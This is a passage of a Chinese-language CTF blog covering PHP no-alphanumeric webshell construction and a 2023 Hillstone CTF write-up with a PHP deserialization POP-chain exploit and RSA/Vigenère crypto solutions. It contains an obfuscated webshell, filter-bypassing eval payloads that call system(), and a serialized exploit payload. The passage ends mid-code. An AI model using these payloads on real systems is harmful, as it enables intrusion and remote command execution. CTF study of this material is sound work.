title="[]ç»•è¿‡"></a>[]ç»•è¿‡</h2><p>æœ‰äº›æƒ…å†µä¸‹åªèƒ½ä½¿ç”¨è‡ªå¢æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯<code>[]</code>ä¹Ÿè¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬éœ€è¦å…¶ä»–æ–¹å¼æ¥è·å–å­—ç¬¦ä¸²</p><p>[]æ˜¯ä¸ºäº†æ„é€ Arrayç„¶åè½¬æ¢æˆå­—ç¬¦ä¸²çš„â€Arrayâ€å†æˆªæ–­ã€‚</p><p>[]è¢«è¿‡æ»¤äº†å…¶å®è¿˜å¯ä»¥åˆ©ç”¨NAN</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$___</span>=((_/_).<span class="hljs-string">&#x27;&#x27;</span>)&#123;<span class="hljs-variable">$__</span>&#125;; <span class="hljs-comment">//N</span><br></code></pre></td></tr></table></figure><p>åœ¨phpçš„å®˜æ–¹æ–‡æ¡£ä¸­æ˜¯è¿™æ ·è§£é‡Šçš„:</p><p>â€œæŸäº›æ•°å­¦è¿ç®—ä¼šäº§ç”Ÿä¸€ä¸ªç”±å¸¸é‡ NAN æ‰€ä»£è¡¨çš„ç»“æœã€‚æ­¤ç»“æœä»£è¡¨ç€ä¸€ä¸ªåœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­æœªå®šä¹‰æˆ–ä¸å¯è¡¨è¿°çš„å€¼â€</p><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=++<span class="hljs-variable">$___</span>;--<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=((_/_).<span class="hljs-string">&#x27;&#x27;</span>)&#123;<span class="hljs-variable">$__</span>&#125;;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;<span class="hljs-variable">$______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;<span class="hljs-variable">$_______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$________</span>=<span class="hljs-variable">$______</span>;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>=(<span class="hljs-variable">$________</span>&#123;++<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$____________</span>=<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$______</span>.<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$_______</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_________</span>;<span class="hljs-variable">$__________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$___________</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__________</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$___________</span>=<span class="hljs-variable">$$___________</span>;<span class="hljs-variable">$____________</span>(<span class="hljs-variable">$___________</span>&#123;<span class="hljs-variable">$_______</span>&#125;);<br><br><span class="hljs-comment">//SYSTEM($_GET&#123;T&#125;)</span><br></code></pre></td></tr></table></figure><h2 id="å­—æ•°é™åˆ¶"><a href="#å­—æ•°é™åˆ¶" class="headerlink" title="å­—æ•°é™åˆ¶"></a>å­—æ•°é™åˆ¶</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$ctfshow</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ctfshow</span>) &lt;= <span class="hljs-number">84</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$ctfshow</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$ctfshow</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;Are you hacking me AGAIN?&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é¢˜ç›®é™åˆ¶ <code>strlen($ctfshow) &lt;= 84</code> ï¼Œéœ€è¦æˆ‘ä»¬å‹ç¼©ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=(_/_._)[<span class="hljs-number">0</span>];<span class="hljs-comment">//ç›´æ¥æ‹¼æ¥æˆå­—ç¬¦ä¸²å¹¶åˆ‡ç‰‡</span><br><span class="hljs-variable">$o</span>=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//$o=++$aæ˜¯å…ˆæŠŠ$aè¿›è¡Œè‡ªå¢ï¼Œè‡ªå¢å®Œæˆä¹‹åå†å°†å€¼è¿”å›ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€å¥ç»“æŸçš„æ—¶å€™ $aå’Œ$oéƒ½æ˜¯O</span><br><span class="hljs-variable">$o</span>=++<span class="hljs-variable">$a</span>.<span class="hljs-variable">$o</span>;<span class="hljs-comment">//$o=&gt;PO,$a=&gt;P</span><br><span class="hljs-variable">$a</span>++;<span class="hljs-comment">//Q</span><br><span class="hljs-variable">$a</span>++;<span class="hljs-comment">//R</span><br><span class="hljs-variable">$o</span>.=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//$o=&gt;POS,$a=&gt;S</span><br><span class="hljs-variable">$o</span>.=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//$o=&gt;POST,$a=&gt;T</span><br><span class="hljs-variable">$_</span>=_.<span class="hljs-variable">$o</span>;<span class="hljs-comment">//_POST</span><br><span class="hljs-variable">$$_</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$$_</span>[_]);<span class="hljs-comment">//$_POST[0]($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>å°†aã€oæ›¿æ¢æˆä¸å¯è§å­—ç¬¦ï¼Œurlç¼–ç ä¼šå°†+æ›¿æ¢æˆç©ºæ ¼ï¼Œæ‰€ä»¥è‡ªè¡Œç¼–ç æˆ%2b</p><p>Payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf_show=$%ff=(_/_._)[<span class="hljs-number">0</span>];$%fe=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff;$%fe=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff.$%fe;$%ff%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b;$%ff%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b;$%fe.=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff;$%fe.=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff;<span class="hljs-variable">$_</span>=_.$%fe;<span class="hljs-variable">$$_</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$$_</span>[_]);&amp;<span class="hljs-number">0</span>=system&amp;_=cat /f1agaaa<br></code></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><h3 id="gettextæ’ä»¶åˆ©ç”¨"><a href="#gettextæ’ä»¶åˆ©ç”¨" class="headerlink" title="gettextæ’ä»¶åˆ©ç”¨"></a>gettextæ’ä»¶åˆ©ç”¨</h3><p>é€šè¿‡PHPINFOå¯ä»¥æŸ¥çœ‹æ˜¯å¦å¼€å¯æ­¤æ’ä»¶</p><p>è¯¥æ‰©å±•æ”¯æŒå‡½æ•°<code>_()</code> ,ç›¸å½“äº<code>gettext()</code>ï¼Œç›´æ¥è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ã€‚è¿™æ ·æœ‰åŠ©äºæˆ‘ä»¬æ„é€ æ›´çŸ­çš„Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">_</span>(a/a)[a];<span class="hljs-comment">//ç›¸å½“äºgettext(0/0)[0],å¾—åˆ°N</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//O</span><br><span class="hljs-variable">$_</span>=_.++<span class="hljs-variable">$a</span>.<span class="hljs-variable">$_</span>;<span class="hljs-comment">//_PO</span><br><span class="hljs-variable">$a</span>++;<span class="hljs-variable">$a</span>++;<span class="hljs-comment">//R</span><br><span class="hljs-variable">$_</span>.=++<span class="hljs-variable">$a</span>.++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//_POST</span><br><span class="hljs-variable">$$_</span>[a](<span class="hljs-variable">$$_</span>[_]);<span class="hljs-comment">//$_POST[a]($_POST[_])</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023å±±çŸ³ç½‘ç§‘CTFå†¬ä»¤è¥ç»“è¥èµ›Write Up</title>
    <link href="/2023/01/15/2023_hillstone_CTF/"/>
    <url>/2023/01/15/2023_hillstone_CTF/</url>
    
    <content type="html"><![CDATA[<p>è¿˜æ˜¯å¤ªèœäº†ï¼Œæœ‰å‡ é¢˜è¯¥åšå‡ºæ¥æ²¡åšå‡ºæ¥ã€‚</p><p>è¿™æ˜¯ç¬¬ä¸€ç¯‡æ–‡ç« ï¼Œå¸Œæœ›ä»¥åèƒ½æŒç»­è¾“å‡ºã€‚</p><p>ä¸ºä»€ä¹ˆè¾“å‡ºï¼Ÿ<a href="https://zhuanlan.zhihu.com/p/88217284">https://zhuanlan.zhihu.com/p/88217284</a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h3><p>é€šè¿‡SplFileObjectè¯»hint.phpçš„ä»£ç ï¼Œä½†å› ä¸ºæœ‰è¿‡æ»¤ï¼Œä¸èƒ½ç›´æ¥è¯»flag</p><p><img src="https://img.katck.com/images/2023/01/15/faee8c11aa6b4026e1697da23a2ffdca.png" alt="faee8c11aa6b4026e1697da23a2ffdca.png"></p><p>base64è§£ç åå®¡è®¡ä»£ç </p><p>POPé“¾ï¼š<code>red::__destruct() =&gt; white::__toString() =&gt; color::__execute() ==&gt; blue::__invoke() ==&gt; red::__call() ==&gt; color::getFlag()</code></p><p>ç„¶åå°†colorç±»ä¸­çš„$c1è®¾ç½®ä¸ºflag.phpå³å¯è¯»å–flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">blue</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">b1</span>(<span class="hljs-variable">$this</span>-&gt;b2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b1-&gt;<span class="hljs-title function_ invoke__">blue</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">red</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;r1 . <span class="hljs-string">&#x27;0xff0000&#x27;</span>; <span class="hljs-comment">#toString</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;r1)(); <span class="hljs-comment">#invoke</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;r1-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">white</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">color</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;c1)();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;c1);<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$color1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>();<br><span class="hljs-variable">$white1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">white</span>();<br><span class="hljs-variable">$red1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>();<br><span class="hljs-variable">$blue1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">blue</span>();<br><span class="hljs-variable">$red2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>();<br><span class="hljs-variable">$color2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>();<br><span class="hljs-variable">$color2</span> -&gt; c1 = <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$red1</span> -&gt; r1 = <span class="hljs-variable">$white1</span>;<br><span class="hljs-variable">$white1</span> -&gt; w = <span class="hljs-variable">$color1</span>;<br><span class="hljs-variable">$color1</span> -&gt; c1 = <span class="hljs-variable">$blue1</span>;<br><span class="hljs-variable">$blue1</span> -&gt; b1 = <span class="hljs-variable">$red2</span>;<br><span class="hljs-variable">$red2</span> -&gt; r1 = <span class="hljs-variable">$color2</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$red1</span>);<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;red&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;r1&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;white&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;w&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;color&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;c1&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;b1&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;red&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;r1&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;color&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;c1&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;&#125;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;b2&quot;</span>;N;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.katck.com/images/2023/01/15/aad6bb29408cba2dcaf5b7dd81fdeaab.png" alt="aad6bb29408cba2dcaf5b7dd81fdeaab.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h3><p>base64ä¹‹åå‡¯æ’’</p><h3 id="brute-vigenere"><a href="#brute-vigenere" class="headerlink" title="brute_vigenere"></a>brute_vigenere</h3><p>é¢˜ç›®æ˜ç¤ºçˆ†ç ´å°±å®Œäº‹äº†ï¼Œç»´å‰å°¼äºšå¯†ç è¡¨ä¸­å¤šåŠ äº†ä¸ª<code>&#123;&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br> <br>dicts = string.ascii_lowercase + <span class="hljs-string">&quot;&#123;&#125;&quot;</span><br>enc = <span class="hljs-string">&#x27;&#123;mvjk&#125;gbxyiutfchpm&#125;ylm&#125;a&#125;amuxlmg&#x27;</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span>  itertools.product(dicts, repeat=<span class="hljs-number">4</span>):<br>    key = <span class="hljs-string">&#x27;&#x27;</span>.join(k)<br>    enc_index = [dicts.index(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc]<br>    key_index = [dicts.index(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key]<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>        ans = (enc_index[i] - key_index[i % <span class="hljs-number">4</span>]) % <span class="hljs-number">28</span><br>        flag += dicts[ans]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hsnctf&#123;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output:hsnctf&#123;wecanalwaystrustvigenere&#125;</span><br></code></pre></td></tr></table></figure><h3 id="smooth-rsa"><a href="#smooth-rsa" class="headerlink" title="smooth_rsa"></a>smooth_rsa</h3><p>é€šè¿‡gen_primes()å’Œgenkey()ç”Ÿæˆç´ æ•°å’Œå…¬é’¥ã€‚</p><p>æœ‰è¶£çš„æ˜¯flagè¢«åˆ†æˆä¸¤éƒ¨åˆ†ï¼Œç¬¬äºŒéƒ¨åˆ†ä½¿ç”¨$e^{m_2}\ mod\ n$åŠ å¯†</p><p><img src="https://img.katck.com/images/2023/01/15/a5373fc4c2f59f490da29d1fa720835a.png" alt="a5373fc4c2f59f490da29d1fa720835a.png" style="zoom:67%;" /></p><p>æ ¹æ®ç´ æ•°ç”Ÿæˆçš„å‡½æ•°åˆ¤æ–­ï¼Œp-1å…‰æ»‘ï¼Œæ ¹æ®Pollardâ€™s p-1ç®—æ³•åˆ†è§£Nã€‚è·å¾—å‰åŠéƒ¨åˆ†flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Pollards_p_1</span>(<span class="hljs-params">N</span>):<br>    a = <span class="hljs-number">2</span><br>    n = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        a = <span class="hljs-built_in">pow</span>(a, n, N)<br>        res = gmpy2.gcd(a-<span class="hljs-number">1</span>, N)<br>        <span class="hljs-keyword">if</span> res != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> res != N:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>, n)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p =&#x27;</span>, res)<br>            <span class="hljs-keyword">return</span> res<br>        n += <span class="hljs-number">1</span>    <br><br><br>n = <span class="hljs-string">&#x27;&#x27;</span><br>c = <span class="hljs-string">&#x27;&#x27;</span><br>e = <span class="hljs-number">0x10001</span><br>p = Pollards_p_1(n)<br>q = n // p<br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br>output:<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 519863</span><br><span class="hljs-string">p = 153745976376847545241555912669157347880949716526722039650361779744915868188863264992722345501177873099593695231122873134365290651521444093220273133944427674631580854029267432922015034145356597048170793885604683602766372487332360313195898198870590532683023388212411561733101072884414575984089097280339407299863</span><br><span class="hljs-string">b&#x27;HSNCTF&#123;015f0d60fab48&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>å¦ä¸€åŠé€šè¿‡æœ‰é™åŸŸå†…æ±‚ç¦»æ•£å¯¹æ•°è·å¾—</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sage: p = 153745976376847545241555912669157347880949716526722039650361779744915868188863264992722345501177873099593695231122873134365290651521444093220273133944427674631580854029267432922015034145356597048170793885604683602766372487332360313195898198870590532683023388212411561733101072884414575984089097280339407299863<br>sage: <span class="hljs-attribute">G</span>=GF(p)<br>sage: <span class="hljs-attribute">g</span>=G(65537)<br>sage: <span 